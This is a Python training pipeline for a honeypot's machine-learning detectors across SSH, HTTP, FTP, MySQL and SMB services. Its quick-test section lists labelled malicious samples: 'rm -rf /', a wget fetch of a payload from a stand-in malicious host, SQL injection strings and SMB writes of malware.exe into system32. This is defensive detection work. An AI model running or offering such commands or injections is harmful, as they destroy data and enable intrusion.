#!/usr/bin/env python3
"""
NEXUS AI Model Training Script
Comprehensive training pipeline for all honeypot services using provided datasets
"""

import sys
import logging
import argparse
from pathlib import Path
import json
import time
from typing import Dict, List, Any

# Add src to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

from ai.data_processor import DataProcessor
from ai.training import ModelTrainer
from ai.config import MLConfig
from ai.embeddings import EmbeddingManager

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('training.log'),
        logging.StreamHandler()
    ]
)

class ComprehensiveTrainer:
    """Comprehensive ML model trainer for all NEXUS services"""
    
    def __init__(self, datasets_dir: str = "datasets"):
        self.datasets_dir = Path(datasets_dir)
        self.data_processor = DataProcessor(str(self.datasets_dir))
        self.services = ['ssh', 'http', 'ftp', 'mysql', 'smb']
        self.results = {}
        
        # Ensure models directory exists
        models_dir = Path("models")
        models_dir.mkdir(exist_ok=True)
        
        logging.info(f"Initialized trainer with datasets from: {self.datasets_dir}")
    
    def train_all_services(self, algorithms: List[str] = None) -> Dict[str, Any]:
        """Train models for all services"""
        if algorithms is None:
            algorithms = ['isolation_forest', 'one_class_svm', 'hdbscan', 'xgboost']
        
        logging.info("[START] Starting comprehensive model training for all services...")
        start_time = time.time()
        
        for service in self.services:
            logging.info(f"\n{'='*60}")
            logging.info(f"[TRAIN] Training models for {service.upper()} service")
            logging.info(f"{'='*60}")
            
            try:
                service_results = self.train_service_models(service, algorithms)
                self.results[service] = service_results
                
                if service_results['success']:
                    logging.info(f"[SUCCESS] Successfully trained {service.upper()} models")
                else:
                    logging.error(f"[ERROR] Failed to train {service.upper()} models: {service_results.get('error', 'Unknown error')}")
                    
            except Exception as e:
                logging.error(f"[ERROR] Critical error training {service}: {e}")
                self.results[service] = {'success': False, 'error': str(e)}
        
        total_time = time.time() - start_time
        logging.info(f"\n[COMPLETE] Training completed in {total_time:.2f} seconds")
        
        # Generate summary report
        self.generate_training_report()
        
        return self.results
    
    def train_service_models(self, service: str, algorithms: List[str]) -> Dict[str, Any]:
        """Train models for a specific service"""
        try:
            # Initialize trainer and config
            config = MLConfig(service)
            trainer = ModelTrainer(service, config)
            
            # Get training data
            logging.info(f"[DATA] Loading training data for {service}...")
            data = self.data_processor.get_processed_data(service)
            service_data = data.get(service, [])
            
            if not service_data:
                logging.warning(f"[WARNING] No training data found for {service}")
                return {'success': False, 'error': 'No training data available'}
            
            logging.info(f"[INFO] Found {len(service_data)} training samples for {service}")
            
            # Split data
            train_data, test_data = self.data_processor.get_training_data(service, test_size=0.2)
            logging.info(f"[SPLIT] Split: {len(train_data)} training, {len(test_data)} testing samples")
            
            results = {}
            
            # Train models based on specified algorithms
            for algorithm in algorithms:
                logging.info(f"[ALGO] Training {algorithm} for {service}...")
                
                try:
                    if algorithm == 'isolation_forest':
                        result = trainer.train_anomaly_detector(train_data, 'isolation_forest')
                    elif algorithm == 'one_class_svm':
                        result = trainer.train_anomaly_detector(train_data, 'one_class_svm')
                    elif algorithm == 'lof':
                        result = trainer.train_anomaly_detector(train_data, 'lof')
                    elif algorithm == 'hdbscan':
                        result = trainer.train_clustering_model(train_data, 'hdbscan')
                    elif algorithm == 'kmeans':
                        result = trainer.train_clustering_model(train_data, 'kmeans')
                    elif algorithm == 'xgboost':
                        # Only train if we have multiple labels
                        labels = [item.get('label', 'normal') for item in train_data]
                        if len(set(labels)) > 1:
                            result = trainer.train_supervised_classifier(train_data)
                        else:
                            logging.info(f"[SKIP] Skipping XGBoost for {service} - insufficient label diversity")
                            continue
                    else:
                        logging.warning(f"[WARNING] Unknown algorithm: {algorithm}")
                        continue
                    
                    results[algorithm] = result
                    
                    # Log key metrics
                    if 'accuracy' in result:
                        logging.info(f"[SUCCESS] {algorithm}: Accuracy = {result['accuracy']:.3f}")
                    if 'f1_score' in result:
                        logging.info(f"   F1 Score = {result['f1_score']:.3f}")
                    if 'n_clusters' in result:
                        logging.info(f"   Clusters = {result['n_clusters']}")
                    
                except Exception as e:
                    logging.error(f"[ERROR] Failed to train {algorithm} for {service}: {e}")
                    results[algorithm] = {'error': str(e)}
            
            # Train embedding similarity
            logging.info(f"[EMBED] Training embedding similarity for {service}...")
            try:
                embedding_result = trainer.train_embedding_similarity(train_data)
                results['embeddings'] = embedding_result
                logging.info(f"[SUCCESS] Embeddings: Index size = {embedding_result['index_size']}")
            except Exception as e:
                logging.error(f"[ERROR] Failed to train embeddings for {service}: {e}")
                results['embeddings'] = {'error': str(e)}
            
            # Save models
            logging.info(f"[SAVE] Saving models for {service}...")
            trainer.save_models()
            
            # Evaluate on test data if available
            if test_data:
                logging.info(f"[EVAL] Evaluating models on test data...")
                evaluation_results = {}
                
                for model_name in trainer.models.keys():
                    try:
                        eval_result = trainer.evaluate_model(model_name, test_data)
                        evaluation_results[model_name] = eval_result
                        
                        if 'accuracy' in eval_result:
                            logging.info(f"[EVAL] {model_name} test accuracy: {eval_result['accuracy']:.3f}")
                            
                    except Exception as e:
                        logging.warning(f"[WARNING] Could not evaluate {model_name}: {e}")
                
                results['evaluation'] = evaluation_results
            
            return {
                'success': True,
                'training_samples': len(train_data),
                'test_samples': len(test_data),
                'algorithms_trained': list(results.keys()),
                'results': results
            }
            
        except Exception as e:
            logging.error(f"❌ Error training {service}: {e}")
            return {'success': False, 'error': str(e)}
    
    def generate_training_report(self):
        """Generate comprehensive training report"""
        report_file = Path("training_report.json")
        
        # Create detailed report
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'datasets_directory': str(self.datasets_dir),
            'services_trained': len([s for s in self.results.values() if s.get('success', False)]),
            'total_services': len(self.services),
            'results': self.results,
            'summary': {}
        }
        
        # Generate summary statistics
        total_samples = 0
        successful_services = 0
        total_algorithms = 0
        
        for service, result in self.results.items():
            if result.get('success', False):
                successful_services += 1
                total_samples += result.get('training_samples', 0)
                total_algorithms += len(result.get('algorithms_trained', []))
        
        report['summary'] = {
            'successful_services': successful_services,
            'total_training_samples': total_samples,
            'total_algorithms_trained': total_algorithms,
            'success_rate': successful_services / len(self.services) if self.services else 0
        }
        
        # Save report
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        logging.info(f"[REPORT] Training report saved to: {report_file}")
        
        # Print summary
        print(f"\n{'='*60}")
        print("TRAINING SUMMARY")
        print(f"{'='*60}")
        print(f"Successful services: {successful_services}/{len(self.services)}")
        print(f"Total training samples: {total_samples:,}")
        print(f"Total algorithms trained: {total_algorithms}")
        print(f"Success rate: {report['summary']['success_rate']:.1%}")
        
        # Print per-service results
        for service, result in self.results.items():
            if result.get('success', False):
                algorithms = result.get('algorithms_trained', [])
                samples = result.get('training_samples', 0)
                print(f"  [SUCCESS] {service.upper()}: {len(algorithms)} algorithms, {samples:,} samples")
            else:
                error = result.get('error', 'Unknown error')
                print(f"  [ERROR] {service.upper()}: {error}")
    
    def quick_test_models(self):
        """Quick test of trained models with sample data"""
        logging.info("\n[TEST] Running quick model tests...")
        
        test_cases = {
            'ssh': [
                {'command': 'ls -la', 'label': 'normal'},
                {'command': 'rm -rf /', 'label': 'malicious'},
                {'command': 'wget http://malicious.com/payload.sh', 'label': 'malicious'}
            ],
            'http': [
                {'request': 'GET /index.html', 'method': 'GET', 'url': '/index.html', 'label': 'normal'},
                {'request': 'GET /admin/config.php', 'method': 'GET', 'url': '/admin/config.php', 'label': 'malicious'},
                {'request': "GET /?id=1' OR 1=1--", 'method': 'GET', 'url': "/?id=1' OR 1=1--", 'label': 'malicious'}
            ],
            'mysql': [
                {'query': 'SELECT * FROM users WHERE id = 1', 'label': 'normal'},
                {'query': "SELECT * FROM users WHERE id = 1' OR 1=1--", 'label': 'malicious'},
                {'query': 'SHOW TABLES', 'label': 'normal'}
            ],
            'ftp': [
                {'command': 'LIST', 'filename': '', 'label': 'normal'},
                {'command': 'RETR', 'filename': 'document.txt', 'label': 'normal'},
                {'command': 'STOR', 'filename': 'malware.exe', 'label': 'malicious'}
            ],
            'smb': [
                {'command': 'READ', 'path': '\\\\server\\share\\file.txt', 'label': 'normal'},
                {'command': 'WRITE', 'path': '\\\\server\\admin$\\system32\\malware.exe', 'label': 'malicious'},
                {'command': 'DELETE', 'path': '\\\\server\\c$\\windows\\system32\\', 'label': 'malicious'}
            ]
        }
        
        for service in self.services:
            if not self.results.get(service, {}).get('success', False):
                continue
                
            logging.info(f"\n[TEST] Testing {service.upper()} models...")
            
            try:
                from ai.detectors import MLDetector
                config = MLConfig(service)
                detector = MLDetector(service, config)
                
                if not detector.is_trained:
                    logging.warning(f"[WARNING] No trained models found for {service}")
                    continue
                
                test_data = test_cases.get(service, [])
                for i, test_case in enumerate(test_data):
                    try:
                        result = detector.score(test_case)
                        anomaly_score = result.get('ml_anomaly_score', 0)
                        labels = result.get('ml_labels', [])
                        
                        expected = test_case.get('label', 'unknown')
                        status = "🟢" if (anomaly_score < 0.5 and expected == 'normal') or (anomaly_score >= 0.5 and expected == 'malicious') else "🔴"
                        
                        logging.info(f"  {status} Test {i+1}: Score={anomaly_score:.3f}, Labels={labels}, Expected={expected}")
                        
                    except Exception as e:
                        logging.error(f"❌ Test {i+1} failed: {e}")
                        
            except Exception as e:
                logging.error(f"❌ Could not test {service} models: {e}")

def main():
    parser = argparse.ArgumentParser(description='NEXUS AI Model Training Pipeline')
    parser.add_argument('--datasets-dir', default='datasets', help='Datasets directory path')
    parser.add_argument('--services', nargs='+', choices=['ssh', 'http', 'ftp', 'mysql', 'smb', 'all'], 
                       default=['all'], help='Services to train models for')
    parser.add_argument('--algorithms', nargs='+', 
                       choices=['isolation_forest', 'one_class_svm', 'lof', 'hdbscan', 'kmeans', 'xgboost', 'all'],
                       default=['all'], help='ML algorithms to train')
    parser.add_argument('--test', action='store_true', help='Run quick model tests after training')
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Resolve services
    if 'all' in args.services:
        services = ['ssh', 'http', 'ftp', 'mysql', 'smb']
    else:
        services = args.services
    
    # Resolve algorithms
    if 'all' in args.algorithms:
        algorithms = ['isolation_forest', 'one_class_svm', 'hdbscan', 'xgboost']
    else:
        algorithms = args.algorithms
    
    # Initialize trainer
    trainer = ComprehensiveTrainer(args.datasets_dir)
    trainer.services = services  # Override with selected services
    
    print("🚀 NEXUS AI Model Training Pipeline")
    print(f"📂 Datasets: {args.datasets_dir}")
    print(f"🎯 Services: {', '.join(services)}")
    print(f"🤖 Algorithms: {', '.join(algorithms)}")
    print(f"{'='*60}")
    
    try:
        # Train models
        results = trainer.train_all_services(algorithms)
        
        # Run tests if requested
        if args.test:
            trainer.quick_test_models()
        
        # Check overall success
        successful_services = sum(1 for r in results.values() if r.get('success', False))
        total_services = len(services)
        
        if successful_services == total_services:
            print(f"\nAll {total_services} services trained successfully!")
            return 0
        elif successful_services > 0:
            print(f"\n[WARNING] {successful_services}/{total_services} services trained successfully")
            return 1
        else:
            print(f"\n[ERROR] No services were trained successfully")
            return 2
            
    except KeyboardInterrupt:
        print("\n[INTERRUPT] Training interrupted by user")
        return 130
    except Exception as e:
        logging.error(f"[ERROR] Critical error: {e}")
        return 1

if __name__ == '__main__':
    sys.exit(main())
